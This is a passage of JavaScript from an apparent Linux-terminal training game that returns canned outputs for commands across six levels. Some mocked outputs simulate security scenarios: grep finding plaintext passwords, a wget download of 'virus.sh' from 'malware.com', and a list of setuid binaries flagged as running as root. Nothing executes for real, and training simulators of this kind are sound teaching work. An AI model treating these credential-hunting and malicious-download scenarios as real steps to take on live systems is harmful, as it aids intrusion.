            } else if (args[0] && trimmedCommand === `cd ${args[0]}`) {
                newFileSystem.currentPath = `${newFileSystem.currentPath}/${args[0]}`.replace(/\/+/g, '/');
                output = `Moved to ${args[0]}`;
                if (activeSubTask?.command === `cd ${args[0]}`) success = true;
            } else {
                output = `bash: cd: invalid spacing, e.g., 'cd folder'`;
            }
            break;

        // ========== Level 2: File Manipulation ==========
        case 'mkdir':
            if (trimmedCommand.includes('-p')) {
                const path = args[1] || 'dir/subdir';
                newFileSystem.files.push(path);
                output = `Created nested directory: ${path}`;
                if (activeSubTask?.command.includes('mkdir -p')) success = true;
            } else if (args[0]) {
                newFileSystem.files.push(`${args[0]}/`);
                output = `Created directory: ${args[0]}`;
                if (activeSubTask?.command.startsWith('mkdir') && !activeSubTask?.command.includes('-p')) success = true;
            }
            break;

        case 'touch':
            if (args[0]) {
                newFileSystem.files.push(args[0]);
                output = `Created empty file: ${args[0]}`;
                if (activeSubTask?.command.startsWith('touch')) success = true;
            }
            break;

        case 'cp':
            if (trimmedCommand.includes('-r')) {
                newFileSystem.files.push(args[1] || 'copied_dir/');
                output = `Copied directory recursively: ${args[0]}`;
                if (activeSubTask?.command.includes('cp -r')) success = true;
            } else if (args.length >= 2) {
                newFileSystem.files.push(args[1]);
                output = `Copied ${args[0]} to ${args[1]}`;
                if (activeSubTask?.command.startsWith('cp') && !activeSubTask?.command.includes('-r')) success = true;
            }
            break;

        case 'mv':
            if (args.length >= 2) {
                newFileSystem.files = newFileSystem.files.filter(f => f !== args[0]);
                newFileSystem.files.push(args[1]);
                output = `Moved/Renamed ${args[0]} to ${args[1]}`;
                if (activeSubTask?.command.startsWith('mv')) success = true;
            }
            break;

        case 'rm':
            if (trimmedCommand.includes('*.txt')) {
                newFileSystem.files = newFileSystem.files.filter(f => !f.endsWith('.txt'));
                output = `Removed all .txt files`;
                if (activeSubTask?.command.startsWith('rm *.txt')) success = true;
            } else if (trimmedCommand.includes('-rf')) {
                const target = args[1] || 'dir';
                newFileSystem.files = newFileSystem.files.filter(f => f !== target && !f.startsWith(target + '/'));
                output = `Force removed directory: ${target}`;
                if (activeSubTask?.command.includes('rm -rf')) success = true;
            } else if (args[0]) {
                newFileSystem.files = newFileSystem.files.filter(f => f !== args[0]);
                output = `Removed file: ${args[0]}`;
                if (activeSubTask?.command.startsWith('rm') && !activeSubTask?.command.includes('-rf')) success = true;
            }
            break;

        // ========== Level 3: Data Mining ==========
        case 'cat':
            output = "root:x:0:0:root:/root:/bin/bash\nstudent:x:1000:1000::/home/student:/bin/bash";
            if (activeSubTask?.command.startsWith('cat')) success = true;
            break;
        case 'head':
            output = "line 1 (Start)\nline 2 (Start)";
            if (activeSubTask?.command.startsWith('head')) success = true;
            break;
        case 'tail':
            output = "Waiting for stream... (mocked tail -f)\nDec 12 10:11 systemd: Started...\nDec 12 10:12 sshd: Accepted password for student";
            if (activeSubTask?.command.startsWith('tail')) success = true;
            break;
        case 'grep':
            if (trimmedCommand.includes('-i')) {
                output = `Matched 'AdMiN' ignoring case: admin:x:1001:1001`;
                if (activeSubTask?.command.includes('grep -i')) success = true;
            } else if (trimmedCommand.includes('-r')) {
                output = "data/file1.txt: password123\ndata/secret.txt: db_password=root";
                if (activeSubTask?.command.includes('grep -r')) success = true;
            } else {
                output = `admin:x:1001:1001:Admin User:/bin/bash`;
                if (activeSubTask?.command.startsWith('grep') && !trimmedCommand.includes('-i') && !trimmedCommand.includes('-r')) success = true;
            }
            break;
        case 'wc':
            output = `  4 passwords.txt`;
            if (activeSubTask?.command.includes('wc -l')) success = true;
            break;
        case 'sort':
            output = "10.0.0.1\n192.168.1.1\n192.168.1.5\n203.0.113.1";
            if (activeSubTask?.command.startsWith('sort')) success = true;
            break;
        case 'uniq':
            output = "10.0.0.1\n192.168.1.1\n203.0.113.1";
            if (activeSubTask?.command.startsWith('uniq')) success = true;
            break;

        // ========== Level 4: Permissions ==========
        case 'whoami':
            output = 'student';
            if (activeSubTask?.command === 'whoami') success = true;
            break;
        case 'id':
            output = 'uid=1000(student) gid=1000(student) groups=1000(student),4(adm),27(sudo)';
            if (activeSubTask?.command === 'id') success = true;
            break;
        case 'chmod':
            if (trimmedCommand.includes('+x')) {
                output = `Execution permission added.`;
            } else if (trimmedCommand.includes('600')) {
                output = `Permissions set to 600 (rw-------).`;
            } else if (trimmedCommand.includes('777')) {
                output = `Warning: Permissions set to 777 (rwxrwxrwx).`;
            } else {
                output = `Parameters updated.`;
            }
            if (activeSubTask?.command.startsWith('chmod')) success = true;
            break;
        case 'chown':
            output = `Ownership changed for ${args[1] || 'file'}`;
            if (activeSubTask?.command.startsWith('chown')) success = true;
            break;

        // ========== Level 5: Processes & Network ==========
        case 'ps':
            output = "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 168056 12840 ?        Ss   09:00   0:01 /sbin/init\nstudent   1337  5.0  2.1 204900 45000 pts/0    R+   10:30   0:05 python3 malware.py";
            if (activeSubTask?.command.startsWith('ps')) success = true;
            break;
        case 'top':
            output = "top - 10:45:00 up 1:45, 1 user, load average: 0.05, 0.02, 0.00\nTasks: 120 total, 1 running, 119 sleeping, 0 stopped, 0 zombie";
            if (activeSubTask?.command.startsWith('top') || activeSubTask?.command.startsWith('htop')) success = true;
            break;
        case 'kill':
            output = `Process 1337 killed (SIGKILL).`;
            if (activeSubTask?.command.startsWith('kill')) success = true;
            break;
        case 'ip':
            output = "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    inet 192.168.1.55/24 brd 192.168.1.255 scope global eth0";
            if (activeSubTask?.command.startsWith('ip')) success = true;
            break;
        case 'ss':
            output = "Netid  State   Recv-Q  Send-Q    Local Address:Port      Peer Address:Port\ntcp    LISTEN  0       128             0.0.0.0:22             0.0.0.0:*  \ntcp    LISTEN  0       128             0.0.0.0:80             0.0.0.0:*";
            if (activeSubTask?.command.startsWith('ss')) success = true;
            break;
        case 'ping':
            output = "PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=119 time=12.5 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=119 time=12.2 ms\n--- 8.8.8.8 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss";
            if (activeSubTask?.command.startsWith('ping')) success = true;
            break;
        case 'curl':
            output = "<!DOCTYPE html>\n<html>\n<head><title>Example</title></head>\n<body>Successfully connected!</body>\n</html>";
            if (activeSubTask?.command.startsWith('curl')) success = true;
            break;
        case 'wget':
            output = "Resolving malware.com... 203.0.113.5\nConnecting to 203.0.113.5:80... connected.\nHTTP request sent, awaiting response... 200 OK\nSaving to: 'virus.sh'";
            if (activeSubTask?.command.startsWith('wget')) success = true;
            newFileSystem.files.push('virus.sh');
            break;

        // ========== Level 6: Power User ==========
        case 'echo':
            if (trimmedCommand.includes('>>')) {
                const file = trimmedCommand.split('>>')[1].trim();
                if (!newFileSystem.files.includes(file)) newFileSystem.files.push(file);
                output = `Appended output to ${file}`;
                if (activeSubTask?.command.includes('>>')) success = true;
            } else if (trimmedCommand.includes('>')) {
                const file = trimmedCommand.split('>')[1].trim();
                if (!newFileSystem.files.includes(file)) newFileSystem.files.push(file);
                output = `Redirected text, overwriting ${file}`;
                if (activeSubTask?.command.includes('>')) success = true;
            } else {
                output = args.join(' ').replace(/["']/g, '');
                if (activeSubTask?.command === 'echo') success = true;
            }
            break;
        case 'tar':
            output = "tools/\ntools/script.sh\ntools/config.yml\nArchive tools.tar.gz created successfully.";
            newFileSystem.files.push('tools.tar.gz');
            if (activeSubTask?.command.startsWith('tar')) success = true;
            break;
        case 'zip':
            output = "Enter password: ****\n  adding: passwords.txt (deflated 12%)\nArchive secret.zip wrapped securely.";
            newFileSystem.files.push('secret.zip');
            if (activeSubTask?.command.startsWith('zip')) success = true;
            break;
        case 'find':
            output = "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n/bin/ping\n(These binaries run as root when executed!)";
            if (activeSubTask?.command.startsWith('find')) success = true;
            break;

        // ========== General ==========
        case 'clear':
            output = 'CLEAR_SIGNAL';
            if (activeSubTask?.command === 'clear') success = true;
            break;

        case 'help':
            output = `Available commands:
L1: pwd, ls, cd
L2: mkdir, touch, cp, mv, rm
L3: cat, head, tail, grep, wc, sort, uniq
L4: whoami, id, chmod, chown
L5: ps, top, kill, ip, ss, ping, curl, wget
L6: echo, tar, zip, find`;
            break;

        default:
            output = `bash: ${baseCommand}: command not found (or invalid spacing)`;
    }

    return { output, success, newFileSystem };
};
